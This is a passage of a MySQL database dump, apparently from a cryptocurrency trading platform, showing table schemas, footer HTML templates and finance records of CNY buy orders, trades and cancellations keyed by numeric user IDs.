target=&quot;_blank&quot;&gt;/Article/index/type/aboutus.html&lt;/a&gt;&quot;&amp;gt;关于我们&amp;lt;/a&amp;gt;\r\n&lt;/p&gt;\r\n|&lt;br /&gt;\r\n&amp;lt;a href=&quot;/Article/index/type/aboutus.html&quot;&amp;gt;联系我们&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n|&lt;br /&gt;\r\n&amp;lt;a href=&quot;/Article/index/type/aboutus.html&quot;&amp;gt;资质证明&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n|&lt;br /&gt;\r\n&amp;lt;a href=&quot;/Article/index/type/aboutus.html&quot;&amp;gt;用户协议&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n|&lt;br /&gt;\r\n&amp;lt;a href=&quot;/Article/index/type/aboutus.html&quot;&amp;gt;法律声明&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n&amp;lt;p style=&quot;margin-top: 5px;text-align: center;&quot;&amp;gt;&lt;br /&gt;\r\nCopyright &amp;copy; 2016&lt;br /&gt;\r\n&amp;lt;a href=&quot;/&quot;&amp;gt;{$C[\'web_name\']}交易平台 &amp;lt;/a&amp;gt;&lt;br /&gt;\r\nAll Rights Reserved.&lt;br /&gt;\r\n&amp;lt;a href=&quot;http://www.miibeian.gov.cn/&quot;&amp;gt;{$C[\'web_icp\']}&amp;lt;/a&amp;gt;{$C[\'web_cnzz\']|htmlspecialchars_decode}&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;/p&amp;gt;&lt;br /&gt;\r\n&amp;lt;p class=&quot;clear1&quot; id=&quot;ut646&quot; style=&quot;margin-top: 10px;text-align: center;&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;a href=&quot;http://webscan.360.cn/index/checkwebsite/url/www.movesay.com&quot; target=&quot;_blank&quot;&amp;gt;&amp;lt;img border=&quot;0&quot; width=&quot;83&quot; height=&quot;31&quot; src=&quot;http://img.webscan.360.cn/status/pai/hash/a272bae5f02b1df25be2c1d9d0b251f7&quot;/&amp;gt;&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n&amp;lt;a href=&quot;http://www.szfw.org/&quot; target=&quot;_blank&quot; id=&quot;ut118&quot; class=&quot;margin10&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;img src=&quot;__UPLOAD__/footer/footer_2.png&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n&amp;lt;a href=&quot;http://www.miibeian.gov.cn/&quot; target=&quot;_blank&quot; id=&quot;ut119&quot; class=&quot;margin10&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;img src=&quot;__UPLOAD__/footer/footer_3.png&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n&amp;lt;a href=&quot;http://www.cyberpolice.cn/&quot; target=&quot;_blank&quot; id=&quot;ut120&quot; class=&quot;margin10&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;img src=&quot;__UPLOAD__/footer/footer_4.png&quot;&amp;gt;&lt;br /&gt;\r\n&amp;lt;/a&amp;gt;&lt;br /&gt;\r\n&amp;lt;/p&amp;gt;&lt;br /&gt;', '', '', '', '', '', '', '1467383018', '0', '', '/Upload/shop/57fb634517d1a.png', '1', 'd', '1', '1');

-- ----------------------------
-- Table structure for movesay_daohang
-- ----------------------------
DROP TABLE IF EXISTS `movesay_daohang`;
CREATE TABLE `movesay_daohang` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `name` varchar(255) NOT NULL COMMENT '名称',
  `title` varchar(255) NOT NULL COMMENT '名称',
  `url` varchar(255) NOT NULL COMMENT 'url',
  `sort` int(11) unsigned NOT NULL COMMENT '排序',
  `addtime` int(11) unsigned NOT NULL COMMENT '添加时间',
  `endtime` int(11) unsigned NOT NULL COMMENT '编辑时间',
  `status` tinyint(4) NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=gbk ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_daohang
-- ----------------------------
INSERT INTO `movesay_daohang` VALUES ('1', 'finance', '财务中心', 'Finance/index', '1', '0', '0', '1');
INSERT INTO `movesay_daohang` VALUES ('2', 'user', '安全中心', 'User/index', '2', '0', '0', '1');
INSERT INTO `movesay_daohang` VALUES ('3', 'game', '应用中心', 'Game/index', '3', '0', '0', '1');
INSERT INTO `movesay_daohang` VALUES ('4', 'article', '帮助中心', 'Article/index', '4', '0', '0', '1');
INSERT INTO `movesay_daohang` VALUES ('6', 'shop', '云购商城', 'Shop/index', '3', '0', '0', '-1');

-- ----------------------------
-- Table structure for movesay_fenhong
-- ----------------------------
DROP TABLE IF EXISTS `movesay_fenhong`;
CREATE TABLE `movesay_fenhong` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `coinjian` varchar(50) NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_fenhong
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_fenhong_log
-- ----------------------------
DROP TABLE IF EXISTS `movesay_fenhong_log`;
CREATE TABLE `movesay_fenhong_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `coinjian` varchar(50) NOT NULL,
  `fenzong` varchar(50) NOT NULL,
  `fenchi` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  `userid` int(11) unsigned NOT NULL COMMENT '用户id',
  PRIMARY KEY (`id`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_fenhong_log
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_finance
-- ----------------------------
DROP TABLE IF EXISTS `movesay_finance`;
CREATE TABLE `movesay_finance` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `userid` int(11) unsigned NOT NULL COMMENT '用户id',
  `coinname` varchar(50) NOT NULL COMMENT '币种',
  `num_a` decimal(20,8) unsigned NOT NULL COMMENT '之前正常',
  `num_b` decimal(20,8) unsigned NOT NULL COMMENT '之前冻结',
  `num` decimal(20,8) unsigned NOT NULL COMMENT '之前总计',
  `fee` decimal(20,8) unsigned NOT NULL COMMENT '操作数量',
  `type` varchar(50) NOT NULL COMMENT '操作类型',
  `name` varchar(50) NOT NULL COMMENT '操作名称',
  `nameid` int(11) NOT NULL COMMENT '操作详细',
  `remark` varchar(50) NOT NULL COMMENT '操作备注',
  `mum_a` decimal(20,8) unsigned NOT NULL COMMENT '剩余正常',
  `mum_b` decimal(20,8) unsigned NOT NULL COMMENT '剩余冻结',
  `mum` decimal(20,8) unsigned NOT NULL COMMENT '剩余总计',
  `move` varchar(50) NOT NULL COMMENT '附加',
  `addtime` int(11) unsigned NOT NULL COMMENT '添加时间',
  `status` tinyint(4) unsigned NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `coinname` (`coinname`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=958704 DEFAULT CHARSET=utf8 COMMENT='财务记录表';

-- ----------------------------
-- Records of movesay_finance
-- ----------------------------
INSERT INTO `movesay_finance` VALUES ('958650', '4966', 'cny', '0.00000000', '0.00000000', '0.00000000', '35000.00000000', '2', 'trade', '432358', '交易中心-委托买入-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', '2393dd4e70ebb11bee7a47f35c35f408', '1505465201', '1');
INSERT INTO `movesay_finance` VALUES ('958651', '4966', 'cny', '0.00000000', '0.00000000', '0.00000000', '70000.00000000', '2', 'trade', '432359', '交易中心-委托买入-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', 'efab7cd852431525a3096e31b48f6990', '1505465696', '1');
INSERT INTO `movesay_finance` VALUES ('958652', '4966', 'cny', '0.00000000', '0.00000000', '0.00000000', '35000.00000000', '2', 'tradelog', '358500', '交易中心-成功买入-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', '2393dd4e70ebb11bee7a47f35c35f408', '1505466386', '1');
INSERT INTO `movesay_finance` VALUES ('958653', '4944', 'cny', '0.00000000', '0.00000000', '0.00000000', '35000.00000000', '1', 'tradelog', '358500', '交易中心-成功卖出-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', '6eb54599f618c389de833bf971075730', '1505466386', '1');
INSERT INTO `movesay_finance` VALUES ('958654', '4966', 'cny', '0.00000000', '0.00000000', '0.00000000', '70000.00000000', '1', 'trade', '432359', '交易中心-自动交易撤销sgc_cny', '0.00000000', '0.00000000', '0.00000000', 'efab7cd852431525a3096e31b48f6990', '1505476626', '1');
INSERT INTO `movesay_finance` VALUES ('958655', '4982', 'cny', '0.00000000', '0.00000000', '0.00000000', '70000.00000000', '2', 'trade', '432362', '交易中心-委托买入-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', '794b1c3831ee4aa2458e15aa84e6345f', '1505476876', '1');
INSERT INTO `movesay_finance` VALUES ('958656', '5025', 'cny', '0.00000000', '0.00000000', '0.00000000', '70000.00000000', '2', 'trade', '432363', '交易中心-委托买入-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', '18f4025e92de88d19a0e2d5075229107', '1505483586', '1');
INSERT INTO `movesay_finance` VALUES ('958657', '5025', 'cny', '0.00000000', '0.00000000', '0.00000000', '70000.00000000', '1', 'trade', '432363', '交易中心-交易撤销sgc_cny', '0.00000000', '0.00000000', '0.00000000', '18f4025e92de88d19a0e2d5075229107', '1505483672', '1');
INSERT INTO `movesay_finance` VALUES ('958658', '4982', 'cny', '0.00000000', '0.00000000', '0.00000000', '70000.00000000', '1', 'trade', '432362', '交易中心-自动交易撤销sgc_cny', '0.00000000', '0.00000000', '0.00000000', '794b1c3831ee4aa2458e15aa84e6345f', '1505487787', '1');
INSERT INTO `movesay_finance` VALUES ('958659', '5022', 'cny', '3000.00000000', '0.00000000', '3000.00000000', '70000.00000000', '2', 'trade', '432364', '交易中心-委托买入-市场sgc_cny', '3000.00000000', '0.00000000', '3000.00000000', 'a1970ee4a798024e0abaec4b3af071c2', '1505790506', '0');
INSERT INTO `movesay_finance` VALUES ('958660', '5041', 'cny', '0.00000000', '0.00000000', '0.00000000', '70000.00000000', '2', 'trade', '432365', '交易中心-委托买入-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', 'dfc8240bbc2f40f66ce9b0ecc3653f25', '1506044049', '1');
INSERT INTO `movesay_finance` VALUES ('958661', '5022', 'cny', '3000.00000000', '0.00000000', '3000.00000000', '70000.00000000', '2', 'tradelog', '358501', '交易中心-成功买入-市场sgc_cny', '3000.00000000', '0.00000000', '3000.00000000', 'a1970ee4a798024e0abaec4b3af071c2', '1506158924', '1');
INSERT INTO `movesay_finance` VALUES ('958662', '4944', 'cny', '0.00000000', '0.00000000', '0.00000000', '70000.00000000', '1', 'tradelog', '358501', '交易中心-成功卖出-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', 'f742e4dbdfbda735bfe641afbffe8f7e', '1506158924', '0');
INSERT INTO `movesay_finance` VALUES ('958663', '5041', 'cny', '0.00000000', '0.00000000', '0.00000000', '70000.00000000', '1', 'trade', '432365', '交易中心-自动交易撤销sgc_cny', '0.00000000', '0.00000000', '0.00000000', 'dfc8240bbc2f40f66ce9b0ecc3653f25', '1506216874', '1');
INSERT INTO `movesay_finance` VALUES ('958664', '5045', 'cny', '10000.00000000', '0.00000000', '10000.00000000', '1.00000000', '2', 'trade', '432368', '交易中心-委托买入-市场sgc_cny', '10000.00000000', '0.00000000', '10000.00000000', '13a647b8b88c714d1621bfb53eb42142', '1506321275', '0');
INSERT INTO `movesay_finance` VALUES ('958665', '5048', 'cny', '10000.00000000', '0.00000000', '10000.00000000', '70000.00000000', '2', 'trade', '432370', '交易中心-委托买入-市场sgc_cny', '10000.00000000', '0.00000000', '10000.00000000', 'e74ad3a8f9be1b123045b6474ea40868', '1506394826', '0');
INSERT INTO `movesay_finance` VALUES ('958666', '5045', 'cny', '10000.00000000', '0.00000000', '10000.00000000', '1.00000000', '2', 'tradelog', '358502', '交易中心-成功买入-市场sgc_cny', '10000.00000000', '0.00000000', '10000.00000000', '13a647b8b88c714d1621bfb53eb42142', '1506395079', '1');
INSERT INTO `movesay_finance` VALUES ('958667', '5043', 'cny', '0.00000000', '0.00000000', '0.00000000', '1.00000000', '1', 'tradelog', '358502', '交易中心-成功卖出-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', 'd38609de9b19dc22a2b98b86cccb1a49', '1506395079', '0');
INSERT INTO `movesay_finance` VALUES ('958668', '5048', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '10000.00000000', '2', 'trade', '432372', '交易中心-委托买入-市场sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', '001c3130483b9614237040fb258ed379', '1506398878', '0');
INSERT INTO `movesay_finance` VALUES ('958669', '5051', 'cny', '1000.00000000', '0.00000000', '1000.00000000', '1000.00000000', '2', 'trade', '432374', '交易中心-委托买入-市场sgc_cny', '1000.00000000', '0.00000000', '1000.00000000', '5f66a63e30f5830dcbc9145761035596', '1506480801', '0');
INSERT INTO `movesay_finance` VALUES ('958670', '5051', 'cny', '1000.00000000', '0.00000000', '1000.00000000', '1000.00000000', '2', 'trade', '432375', '交易中心-委托买入-市场sgc_cny', '1000.00000000', '0.00000000', '1000.00000000', '5f66a63e30f5830dcbc9145761035596', '1506480935', '1');
INSERT INTO `movesay_finance` VALUES ('958671', '5051', 'cny', '1000.00000000', '0.00000000', '1000.00000000', '1000.00000000', '2', 'tradelog', '358503', '交易中心-成功买入-市场sgc_cny', '1000.00000000', '0.00000000', '1000.00000000', '5f66a63e30f5830dcbc9145761035596', '1506481315', '1');
INSERT INTO `movesay_finance` VALUES ('958672', '5050', 'cny', '10000.00000000', '0.00000000', '10000.00000000', '1000.00000000', '1', 'tradelog', '358503', '交易中心-成功卖出-市场sgc_cny', '10000.00000000', '0.00000000', '10000.00000000', '35d7517bf8d2514dd6d3a527ff1e3f8a', '1506481315', '0');
INSERT INTO `movesay_finance` VALUES ('958673', '5052', 'cny', '0.00000000', '0.00000000', '0.00000000', '2.00000000', '2', 'trade', '432377', '交易中心-委托买入-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', 'e76677e29176c00fb4f6642e00ff8acc', '1506511521', '1');
INSERT INTO `movesay_finance` VALUES ('958674', '5048', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '1000.00000000', '2', 'trade', '432379', '交易中心-委托买入-市场sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', 'dc75b79c6112dea8cbd97ad90450d64f', '1506565703', '1');
INSERT INTO `movesay_finance` VALUES ('958675', '5048', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '70000.00000000', '1', 'trade', '432370', '交易中心-自动交易撤销sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', 'cfb82e07eba45d21c51f8834d6f2e103', '1506567714', '1');
INSERT INTO `movesay_finance` VALUES ('958676', '5048', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '70000.00000000', '2', 'trade', '432383', '交易中心-委托买入-市场sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', '34ec79c43368117a4b60ce67d8bf67c7', '1506583971', '1');
INSERT INTO `movesay_finance` VALUES ('958677', '5050', 'cny', '10000.00000000', '0.00000000', '10000.00000000', '10.00000000', '2', 'trade', '432384', '交易中心-委托买入-市场sgc_cny', '10000.00000000', '0.00000000', '10000.00000000', '65db4ca30c83b64347fe82e7be7500dd', '1506584177', '1');
INSERT INTO `movesay_finance` VALUES ('958678', '5050', 'cny', '10000.00000000', '0.00000000', '10000.00000000', '2.00000000', '2', 'trade', '432385', '交易中心-委托买入-市场sgc_cny', '10000.00000000', '0.00000000', '10000.00000000', 'c96a1ad3911bd8adb9ec38f1fad81f60', '1506584794', '1');
INSERT INTO `movesay_finance` VALUES ('958679', '5048', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '1000.00000000', '1', 'trade', '432379', '交易中心-自动交易撤销sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', '82afa2cb4eb7dc1c4ee7360ec715b4a3', '1506738597', '1');
INSERT INTO `movesay_finance` VALUES ('958680', '5048', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '70000.00000000', '1', 'trade', '432383', '交易中心-自动交易撤销sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', 'cfb82e07eba45d21c51f8834d6f2e103', '1506756777', '1');
INSERT INTO `movesay_finance` VALUES ('958681', '5050', 'cny', '10000.00000000', '0.00000000', '10000.00000000', '10.00000000', '1', 'trade', '432384', '交易中心-自动交易撤销sgc_cny', '10000.00000000', '0.00000000', '10000.00000000', '512154a723d5dfbf4e52722cae7c9353', '1506757036', '1');
INSERT INTO `movesay_finance` VALUES ('958682', '5050', 'cny', '10000.00000000', '0.00000000', '10000.00000000', '2.00000000', '1', 'trade', '432385', '交易中心-自动交易撤销sgc_cny', '10000.00000000', '0.00000000', '10000.00000000', '290d4362a1b14d4713e895c99d6e5482', '1506757688', '1');
INSERT INTO `movesay_finance` VALUES ('958683', '5067', 'cny', '0.00000000', '0.00000000', '0.00000000', '10.00000000', '2', 'trade', '432386', '交易中心-委托买入-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', 'bcfd838915506901355e92447ea63124', '1513097908', '1');
INSERT INTO `movesay_finance` VALUES ('958684', '5069', 'cny', '0.00000000', '0.00000000', '0.00000000', '1000.00000000', '2', 'trade', '432387', '交易中心-委托买入-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', '354a3fc5159510b5123a230d4a081ec6', '1513425917', '1');
INSERT INTO `movesay_finance` VALUES ('958685', '5069', 'cny', '0.00000000', '0.00000000', '0.00000000', '1000.00000000', '1', 'trade', '432387', '交易中心-交易撤销sgc_cny', '0.00000000', '0.00000000', '0.00000000', '354a3fc5159510b5123a230d4a081ec6', '1513426388', '1');
INSERT INTO `movesay_finance` VALUES ('958686', '5075', 'cny', '0.00000000', '0.00000000', '0.00000000', '1000.00000000', '2', 'trade', '432388', '交易中心-委托买入-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', 'a2fe89e5bbe62e53f75bb02da935df01', '1513665182', '1');
INSERT INTO `movesay_finance` VALUES ('958687', '5074', 'cny', '0.00000000', '0.00000000', '0.00000000', '70000.00000000', '2', 'trade', '432389', '交易中心-委托买入-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', '9dc8c94a9b1c4b7a471c3c9a2b90fbc0', '1513665677', '1');
INSERT INTO `movesay_finance` VALUES ('958688', '5077', 'cny', '0.00000000', '0.00000000', '0.00000000', '1000.00000000', '2', 'trade', '432390', '交易中心-委托买入-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', 'e504411f59a318e368b5f7a1cbe7ed2a', '1513850508', '1');
INSERT INTO `movesay_finance` VALUES ('958689', '5058', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '10.00000000', '2', 'trade', '432392', '交易中心-委托买入-市场sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', 'aca327a05e9bbde3ae36a1f785a9c50f', '1514877089', '0');
INSERT INTO `movesay_finance` VALUES ('958690', '5058', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '10.00000000', '2', 'tradelog', '358504', '交易中心-成功买入-市场sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', 'aca327a05e9bbde3ae36a1f785a9c50f', '1514877368', '1');
INSERT INTO `movesay_finance` VALUES ('958691', '5048', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '10.00000000', '1', 'tradelog', '358504', '交易中心-成功卖出-市场sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', 'd803a631e93eb2f1cbfc74e17c535e75', '1514877368', '1');
INSERT INTO `movesay_finance` VALUES ('958692', '5058', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '2.00000000', '2', 'trade', '432394', '交易中心-委托买入-市场sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', 'c101f3a2afd46250e2556d2078bfe48b', '1514878762', '1');
INSERT INTO `movesay_finance` VALUES ('958693', '5058', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '2.00000000', '2', 'tradelog', '358505', '交易中心-成功买入-市场sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', 'c101f3a2afd46250e2556d2078bfe48b', '1514878811', '1');
INSERT INTO `movesay_finance` VALUES ('958694', '5048', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '2.00000000', '1', 'tradelog', '358505', '交易中心-成功卖出-市场sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', '79847b5e34fc8c2b8df132f5a0782ffd', '1514878811', '1');
INSERT INTO `movesay_finance` VALUES ('958695', '5095', 'cny', '10000.00000000', '0.00000000', '10000.00000000', '10.00000000', '2', 'trade', '432396', '交易中心-委托买入-市场sgc_cny', '10000.00000000', '0.00000000', '10000.00000000', '2c70834baf05dc97ccb2081434245ec3', '1515411833', '0');
INSERT INTO `movesay_finance` VALUES ('958696', '5095', 'cny', '10000.00000000', '0.00000000', '10000.00000000', '10.00000000', '2', 'tradelog', '358506', '交易中心-成功买入-市场sgc_cny', '10000.00000000', '0.00000000', '10000.00000000', '2c70834baf05dc97ccb2081434245ec3', '1515489224', '1');
INSERT INTO `movesay_finance` VALUES ('958697', '5048', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '10.00000000', '1', 'tradelog', '358506', '交易中心-成功卖出-市场sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', 'd803a631e93eb2f1cbfc74e17c535e75', '1515489224', '0');
INSERT INTO `movesay_finance` VALUES ('958698', '5100', 'cny', '0.00000000', '0.00000000', '0.00000000', '1.00000000', '2', 'trade', '432398', '交易中心-委托买入-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', 'd84d2a33f0da5f7d07860db556af0d1d', '1516520350', '1');
INSERT INTO `movesay_finance` VALUES ('958699', '5100', 'cny', '0.00000000', '0.00000000', '0.00000000', '1.00000000', '1', 'trade', '432398', '交易中心-交易撤销sgc_cny', '0.00000000', '0.00000000', '0.00000000', 'd84d2a33f0da5f7d07860db556af0d1d', '1516522437', '1');
INSERT INTO `movesay_finance` VALUES ('958700', '5058', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '1.00000000', '2', 'trade', '432399', '交易中心-委托买入-市场sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', '1f704cf2607245fec92550cbf2862501', '1516781785', '1');
INSERT INTO `movesay_finance` VALUES ('958701', '5077', 'cny', '0.00000000', '0.00000000', '0.00000000', '1000.00000000', '1', 'trade', '432390', '交易中心-管理员交易撤销买单sgc_cny', '0.00000000', '0.00000000', '0.00000000', 'e504411f59a318e368b5f7a1cbe7ed2a', '1516952925', '1');
INSERT INTO `movesay_finance` VALUES ('958702', '5105', 'cny', '0.00000000', '0.00000000', '0.00000000', '1000.00000000', '2', 'trade', '432401', '交易中心-委托买入-市场sgc_cny', '0.00000000', '0.00000000', '0.00000000', 'f51eae1ffc05b606350d55662a3dfd3e', '1516953941', '1');
INSERT INTO `movesay_finance` VALUES ('958703', '5058', 'cny', '100000.00000000', '0.00000000', '100000.00000000', '101.00000000', '2', 'trade', '432402', '交易中心-委托买入-市场sgc_cny', '100000.00000000', '0.00000000', '100000.00000000', 'ef7446fd2d89a680f8ffce449f0461e3', '1517214232', '1');

-- ----------------------------
-- Table structure for movesay_footer
-- ----------------------------
DROP TABLE IF EXISTS `movesay_footer`;
CREATE TABLE `movesay_footer` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL,
  `title` varchar(200) NOT NULL,
  `url` varchar(200) NOT NULL,
  `img` varchar(200) NOT NULL,
  `type` varchar(200) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_footer
-- ----------------------------
INSERT INTO `movesay_footer` VALUES ('1', '1', '关于我们', '/Article/index/type/aboutus.html', '', '1', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('2', '1', '联系我们', '/Article/index/type/aboutus.html', '', '1', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('3', '1', '资质证明', '/Article/index/type/aboutus.html', '', '1', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('4', '1', '用户协议', '/Article/index/type/aboutus.html', '', '1', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('5', '1', '法律声明', '/Article/index/type/aboutus.html', '', '1', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('6', '1', '1', '/', 'footer_1.png', '2', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('7', '1', '1', 'http://www.szfw.org/', 'footer_2.png', '2', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('8', '1', '1', 'http://www.miibeian.gov.cn/', 'footer_3.png', '2', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('9', '1', '1', 'http://www.cyberpolice.cn/', 'footer_4.png', '2', '', '1', '111', '0', '1');

-- ----------------------------
-- Table structure for movesay_huafei
-- ----------------------------
DROP TABLE IF EXISTS `movesay_huafei`;
CREATE TABLE `movesay_huafei` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `userid` int(11) unsigned NOT NULL,
  `moble` varchar(255) NOT NULL,
  `num` int(11) unsigned NOT NULL,
  `type` varchar(50) NOT NULL,
  `mum` decimal(20,8) NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_huafei
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_huafei_coin
-- ----------------------------
DROP TABLE IF EXISTS `movesay_huafei_coin`;
CREATE TABLE `movesay_huafei_coin` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `coinname` varchar(50) NOT NULL,
  `price` varchar(255) NOT NULL,
  `status` tinyint(4) NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_huafei_coin
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_huafei_type
-- ----------------------------
DROP TABLE IF EXISTS `movesay_huafei_type`;
CREATE TABLE `movesay_huafei_type` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `status` tinyint(4) NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_huafei_type
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_invit
-- ----------------------------
DROP TABLE IF EXISTS `movesay_invit`;
CREATE TABLE `movesay_invit` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `invit` int(11) unsigned NOT NULL,
  `name` varchar(50) NOT NULL,
  `type` varchar(50) NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `fee` decimal(20,8) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `invit` (`invit`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='推广奖励表';

-- ----------------------------
-- Records of movesay_invit
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_issue
-- ----------------------------
DROP TABLE IF EXISTS `movesay_issue`;
CREATE TABLE `movesay_issue` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `buycoin` varchar(50) NOT NULL,
  `num` bigint(20) unsigned NOT NULL,
  `deal` int(11) unsigned NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `limit` int(11) unsigned NOT NULL,
  `time` varchar(255) NOT NULL,
  `tian` varchar(255) NOT NULL,
  `ci` varchar(255) NOT NULL,
  `jian` varchar(255) NOT NULL,
  `min` varchar(255) NOT NULL,
  `max` varchar(255) NOT NULL,
  `content` text NOT NULL,
